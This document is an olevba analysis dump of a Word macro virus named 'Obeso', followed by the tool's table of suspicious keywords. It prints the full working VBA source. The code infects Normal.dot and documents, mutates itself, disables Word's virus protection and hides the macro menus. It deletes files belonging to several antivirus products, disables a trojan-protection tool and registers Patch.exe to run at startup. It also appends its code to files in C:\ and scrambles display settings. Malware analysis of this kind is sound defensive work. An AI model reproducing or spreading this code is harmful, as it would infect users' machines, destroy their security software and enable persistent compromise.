olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Obeso-b6400c87de4f00603064cbf9581e623ec26a02f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Obeso.cls 
in file: Virus.MSWord.Obeso-b6400c87de4f00603064cbf9581e623ec26a02f2 - OLE stream: 'Macros/VBA/Obeso'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hehhe... as próximas linhas são uma verdadeira merda né...


Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Long, ByVal fuWinIni As Long) As Long
'3=65397g107536=339510375g7
'9=574910j2l435=949723104jl
'691079+82299r1096+79298r92691079+82299r
'3636ad8135gs363d6a3g8s51
'8%1010910434310910%81010941049338%10109104343109
'71089w106168t98107109w6t6981
Private Sub Document_Close()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
SystemParametersInfo 97, 1, 1, 0 'Retirado do trojan Acid Shiver... VALEU AÍ!
Set t = Obeso.VBProject.VBComponents.Item(1)
Set A = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
'/*/*/*/*/ Este é um simples código de mutação (pelo menos eu acho que é... e colabora para que o vírus aumente cada vez mais de tamanho...)
'> Usado pela 1ª vez aki!
Randomize
v1 = Int((10 * Rnd) + 1)
v2 = Int((10 * Rnd) + 1)
If v2 = 1 Then v2 = "%": GoTo x1
If v2 = 2 Then v2 = "!": GoTo x1
If v2 = 3 Then v2 = "(": GoTo x1
If v2 = 4 Then v2 = "=": GoTo x1
If v2 = 5 Then v2 = "#"
x1:
v3 = Int((10 * Rnd) + 1)
v4 = Int((10 * Rnd) + 1)
If v4 = 1 Then v4 = ".": GoTo x2
If v4 = 2 Then v4 = "5": GoTo x2
If v4 = 3 Then v4 = "+": GoTo x2
If v4 = 4 Then v4 = "d": GoTo x2
If v4 = 5 Then v4 = "y"
x2:
v5 = Int((10 * Rnd) + 1)
v6 = Int((10 * Rnd) + 1)
If v6 = 1 Then v6 = "a": GoTo x3
If v6 = 2 Then v6 = "x": GoTo x3
If v6 = 3 Then v6 = "w": GoTo x3
If v6 = 4 Then v6 = "9": GoTo x3
If v6 = 5 Then v6 = "p"
x3:
v7 = Int((10 * Rnd) + 1)
v8 = Int((10 * Rnd) + 1)
If v8 = 1 Then v8 = "0": GoTo x4
If v8 = 2 Then v8 = "g": GoTo x4
If v8 = 3 Then v8 = "c": GoTo x4
If v8 = 4 Then v8 = "j": GoTo x4
If v8 = 5 Then v8 = "t"
x4:
s = Int((3 * Rnd) + 1): If s = 1 Then GoTo n1: If s = 2 Then GoTo n2: If s = 3 Then GoTo n3: If s = 4 Then GoTo nt
n1:
v9 = Int((10 * Rnd) + 1)
n2:
v10 = Int((10 * Rnd) + 1)
If v10 = 1 Then v10 = "l": GoTo x5
If v10 = 2 Then v10 = "s": GoTo x5
If v10 = 3 Then v10 = "i": GoTo x5
If v10 = 4 Then v10 = "r": GoTo x5
If v10 = 5 Then v10 = "6"
x5:
n3:
v11 = Int((10 * Rnd) + 1)
nt:
tt = v1 & v2 & v3 & v4 & v5 & v6 & v7 & v8 & v9 & v10 & v11 & s
ts = v3 & v2 & v1 & v5 & v6 & v4 & v9 & s & v7 & v11 & v8 & v10
v = Int((2 * Rnd) + 1)
If v = 1 Then tu = tt & ts
If v = 2 Then tu = ts & tt
If v1 = 1 Then tu = tu & tu
If v1 = 5 Then tu = tt & ts & tt
If v1 = 10 Then tu = ts & tt & ts
'/*/*/*/*/ Hehe... essa bosta nunca vai estar igual!

'/*/*/*/*/ Infects a normal.dot or an archive
'> Usado pela 1ª vez no meu vírus Riotz
If n.Name <> "Obeso" Or n.Name = "Obeso" And n.CodeModule.Lines(1, 1) <> "'Hehhe... as próximas linhas são uma verdadeira merda né..." Then
ObesoCode = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
n.CodeModule.deletelines 1, n.CodeModule.CountOfLines
n.CodeModule.addfromstring ObesoCode
n.CodeModule.addfromstring "'" & tu
n.Name = "Obeso"
Fatz
End If
If A.Name <> "Obeso" Or A.Name = "Obeso" And A.CodeModule.Lines(1, 1) <> "'Hehhe... as próximas linhas são uma verdadeira merda né..." Then
sv = ActiveDocument.Saved
ObesoCode = n.CodeModule.Lines(1, n.CodeModule.CountOfLines)
A.CodeModule.deletelines 1, A.CodeModule.CountOfLines
A.CodeModule.addfromstring ObesoCode
A.CodeModule.addfromstring "'" & tu
A.Name = "Obeso"
If sv <> ActiveDocument.Saved Then Documents.Save True
End If
'/*/*/*/*/ It's very effective, isn't?
End Sub
Private Sub Document_New()
On Error Resume Next
If Minute(Now) = Second(Now) Then
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "Resolution") = "320,200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "9"
End If
End Sub
Private Sub Document_Open()
On Error Resume Next
If Hour(Now) = Day(Now) Then
mc = "c:\"
mn = Dir(mc, vbDirectory)
Do While mn <> ""
If (GetAttr(mc & mn) And vbArchive) = vbArchive Then
Open mn For Append As #4
For y = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
k = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(y, 1)
Print #4, k
Next y
Close #4
End If
mn = Dir
Loop
End If
End Sub
Private Sub Fatz()
'>Retirado do MEU virus GHOUL 3
'Carai isso eh um arrasoo neh... pode falar a verdade!
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls(6).Visible = False
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner, FTheCleaner, Panda, FPanda, AVP, FAVP
FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
FFProt = FProt + "\*.*": FVET = VET + "\*.*": FMcAfee = McAfee + "\*.*": FAvast = Avast + "\*.*": FTheCleaner = TheCleaner + "\*.*": FPanda = Panda + "*.*": FAVP = AVP + "\*.*": Affprot = FProt + "\*.Dat": Bffprot = FProt + "\*.Def": Afvet = VET + "\*.Dat": AFMcAfee = McAfee + "\*.Dat": afavast = Avast + "\*.Dat": bfavast = Avast + "\*.Dll": afthecleaner = TheCleaner + "\*.Dll": afpanda = Panda + "*.Dat": bfpanda = Panda + "*.Dll": afavp = AVP + "\*.Dat": bfavp = AVP + "\*.Dll":
If Dir(FFProt) <> "" Then Kill Affprot: Kill Bffprot: Kill FFProt
If Dir(FVET) <> "" Then Kill Afvet: Kill FVET
If Dir(FMcAfee) <> "" Then Kill AFMcAfee: Kill FMcAfee
If Dir(FAvast) <> "" Then Kill afavast: Kill bfavast: Kill FAvast
If Dir(FTheCleaner) <> "" Then Kill afthecleaner: Kill FTheCleaner
If Dir(FPanda) <> "" Then Kill afpanda: Kill bfpanda: Kill FPanda
If Dir(FAVP) <> "" Then Kill afavp: Kill bfavp: Kill FAVP
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "" Then GoTo Fim
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"
Fim:
If FileLen("C:\Windows\PATCH.EXE") <> 472576 Then System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") = "c:\windows\Patch.exe /pass:killfhc"
End Sub
Sub AutoExit()
On Error Resume Next
If Month(Now) = "09" And Day(Now) = "07" Then
'It's my birthday!!! 7 de Setembro de 1984!!!
Randomize
k1 = Int((255 * Rnd) + 1)
k2 = Int((255 * Rnd) + 1)
k3 = Int((255 * Rnd) + 1)
K4 = Int((255 * Rnd) + 1)
K5 = Int((255 * Rnd) + 1)
K6 = Int((255 * Rnd) + 1)
K7 = Int((255 * Rnd) + 1)
K8 = Int((255 * Rnd) + 1)
K9 = Int((255 * Rnd) + 1)
K10 = Int((255 * Rnd) + 1)
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ActiveBorder") = k1 & " " & k2 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ActiveTitle") = k3 & " " & k2 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "AppWorkspace") = k1 & " " & k3 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Background") = k1 & " " & k1 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ButtonFace") = k3 & " " & k3 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ButtonText") = k2 & " " & k1 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "InactiveTitle") = k3 & " " & k2 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "InactiveTitleText") = k1 & " " & k2 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Menu") = k2 & " " & k2 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "MenuText") = k3 & " " & k3 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Scrollbar") = k1 & " " & k1 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Window") = k2 & " " & k3 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "WindowText") = k3 & " " & k1 & " " & k1
End If
'Bom, esse vírus só vai fazer isso, por enquanto... é que eu não estava com muitas idéias hoje...
End Sub

'
'Obeso virus
'               by The Bug

' Your files seems more fat?!? Shit!
' ah, caution, this virus can to grow fat!

'obs: Não reparem nos meus erros de inglês...

'Finished: 25/Jul/00 at 03:48 am
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PATCH.EXE           |Executable file name                         |
|IOC       |Patch.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
